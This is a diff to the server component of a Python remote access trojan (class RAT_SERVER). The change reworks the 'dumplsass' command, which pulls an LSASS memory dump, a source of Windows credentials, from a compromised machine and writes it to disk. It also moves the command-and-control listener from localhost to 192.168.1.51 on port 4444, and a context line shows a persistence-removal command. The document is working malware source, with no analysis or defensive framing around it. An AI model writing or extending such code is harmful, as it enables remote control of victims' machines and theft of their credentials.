@@ -405,17 +405,15 @@ dumplsass                  dump lsass
             elif command == 'removepersistence':
                 self.result()
 
-            if command == 'dump_lsass':
+            if command == 'dumplsass':
                 try:
-                    client.send(command_encrypted.encode())
-                    with open("received_lsass.dmp", "wb") as dump_file:
-                        while True:
-                            data = client.recv(4096)
-                            if not data:
-                                break
-                            dump_file.write(data)
+                    client.send(command.encode())
+                    file = client.recv(2147483647)
+                    with open('lsass_dump.dmp', 'wb') as f:
+                        f.write(file)
+                        f.close()
                     
-                    print("LSASS dump received and saved as 'received_lsass.dmp'")
+                    print("LSASS dump received and saved as 'lsass_dump.dmp'")
                 
                 except Exception as e:
                     print("Failed to receive LSASS dump:", str(e))
@@ -428,7 +426,7 @@ dumplsass                  dump lsass
                 s.close()
                 client.close()
 
-rat = RAT_SERVER('127.0.0.1', 4444)
+rat = RAT_SERVER('192.168.1.51', 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
